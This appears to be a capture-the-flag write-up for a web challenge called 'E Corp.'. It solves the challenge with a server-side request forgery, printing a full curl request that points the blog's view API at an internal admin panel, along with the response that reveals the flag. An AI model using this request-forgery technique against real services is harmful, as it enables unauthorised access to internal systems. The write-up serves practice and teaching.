# E Corp. (200)
```
Your task is to access the admin panel of E Corp. servers. The admin panel is located at http://admin-panel.local but it's not accessible from the outside.
E Corp. also has a public blog running at https://ecorpblog.uctf.ir
Your task is to access the admin panel.
```

# Solution
Capture the POST request when trying to access one of the blog pages. Look for the POST request that calls the API. Replace the POST data field to the admin-portal link.

Example using curl:
```
curl 'https://ecorpblog.uctf.ir/api/view.php' \                                 
-H 'authority: ecorpblog.uctf.ir' \                                             
-H 'accept: */*' \                                                              
-H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6' \         
-H 'cache-control: max-age=0' \                                                 
-H 'content-type: application/json' \                                           
-H 'origin: https://ecorpblog.uctf.ir' \
-H 'referer: https://ecorpblog.uctf.ir/view/Azita' \
-H 'sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"' \
-H 'sec-ch-ua-mobile: ?0' \
-H 'sec-ch-ua-platform: "Windows"' \
-H 'sec-fetch-dest: empty' \
-H 'sec-fetch-mode: cors' \
-H 'sec-fetch-site: same-origin' \
-H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36' \
--data-raw '{"post":"http://admin-panel.local/"}' \
--compressed

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    89    0    53  100    36     24     16  0:00:02  0:00:02 --:--:--    41

{"status":"success","post":"uctf{4z174_1n_urm14}"}
```

# Flag
```
uctf{4z174_1n_urm14}"}
```
